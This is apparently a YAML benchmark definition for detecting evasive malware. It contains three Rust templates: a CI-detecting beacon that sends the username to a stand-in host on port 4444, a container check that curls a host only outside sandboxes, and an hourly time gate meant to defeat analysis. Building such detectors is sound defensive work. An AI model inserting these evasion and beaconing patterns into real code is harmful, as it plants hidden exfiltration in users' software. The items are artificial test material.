id: c7_evasive_v2
category: C7
name: Evasive and Environment-Gated Execution
description: Inspects environment indicators (CI systems, containers, virtual environments) to selectively trigger malicious actions.
defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
variants:
  - id: c7_ci_pipeline_detector
    surface_variant: ci_env_fingerprint
    obfuscation_level: 0
    domain_invalid: "pipeline-beacon.builds.invalid"
    domain_fabricated: "build-telemetry-sink.org"
    code_template: |
      fn {fn_name}() {
          // Check for continuous integration environment indicators
          let in_ci = std::env::var("CI").is_ok()
              || std::env::var("GITHUB_ACTIONS").is_ok()
              || std::env::var("GITLAB_CI").is_ok();
          if in_ci {
              if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:4444") {
                  use std::io::Write;
                  let user = std::env::var("USER").unwrap_or_default();
                  let _ = stream.write_all(format!("CI_BEACON: {user}\n").as_bytes());
              }
          }
      }

  - id: c7_container_sandbox_evader
    surface_variant: container_boundary_check
    obfuscation_level: 1
    domain_invalid: "audit-collector.cloud.invalid"
    domain_fabricated: "cloud-audit-logger.net"
    code_template: |
      fn {fn_name}() {
          let has_docker = std::path::Path::new("/.dockerenv").exists();
          let has_cgroup = std::fs::read_to_string("/proc/1/cgroup")
              .map(|s| s.contains("docker") || s.contains("containerd"))
              .unwrap_or(false);
          if !has_docker && !has_cgroup {
              let url = ["http://", "{target_host}", "/active"].concat();
              let _ = std::process::Command::new("curl").arg("-s").arg(&url).spawn();
          }
      }

  - id: c7_delayed_timer_gate
    surface_variant: temporal_execution_gate
    obfuscation_level: 2
    domain_invalid: "timer-sync.infra.invalid"
    domain_fabricated: "infra-sync-dispatcher.io"
    code_template: |
      fn {fn_name}() {
          if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
              // Execute only on even hours to defeat single-run analysis
              if (dur.as_secs() / 3600) % 2 == 0 {
                  let host_bytes: [u8; 15] = [0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x5f, 0x68, 0x6f, 0x73, 0x74, 0x2e, 0x63, 0x6f, 0x6d];
                  let target = "{target_host}";
                  let _ = std::net::TcpStream::connect((target, 8080));
              }
          }
      }
